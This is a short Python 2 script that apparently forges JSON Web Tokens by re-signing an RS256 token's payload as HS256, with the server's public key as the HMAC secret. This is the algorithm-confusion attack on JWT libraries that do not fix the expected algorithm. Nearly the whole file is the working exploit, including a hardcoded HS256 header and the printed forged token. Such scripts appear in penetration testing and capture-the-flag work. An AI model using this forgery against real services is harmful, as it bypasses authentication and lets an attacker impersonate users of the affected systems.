#!/usr/bin/env python

'''
Convert JWT tokens from RS256 to HS256
'''

import os, sys
import re
import hmac
import hashlib
import base64,binascii

def main(argc, argv):
    if argc != 3:
        print "Usage: %s {RS256 JWT token} {Public key file}" % argv[0]
        sys.exit(1)

    print '\n'
    JWT_token = argv[1]
    pubkey_file = argv[2]

    m = re.search('.*\.(.*)\..*', JWT_token)
    
    JWT_payload = m.group(1)

    # print '[+] header:', JWT_header
    # print '[+] payload:', JWT_payload

    data = JWT_header+'.'+JWT_payload

    with open(pubkey_file, 'r') as f:
        pkey = f.read()+'\n'

    h = hmac.new(pkey, data, DIGEST).hexdigest()


    print '[+] data:', data
    print '[+] HMAC:', h

    sign = base64.urlsafe_b64encode(binascii.a2b_hex(h)).replace('=','')
    print '[+] signature:', sign

    print '-----------'
    print '[+] new JWT token:', data+'.'+sign


DIGEST = hashlib.sha256
JWT_header = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9'     # {"typ":"JWT", "alg":"HS256"}

if __name__ == "__main__":
    main(len(sys.argv), sys.argv)
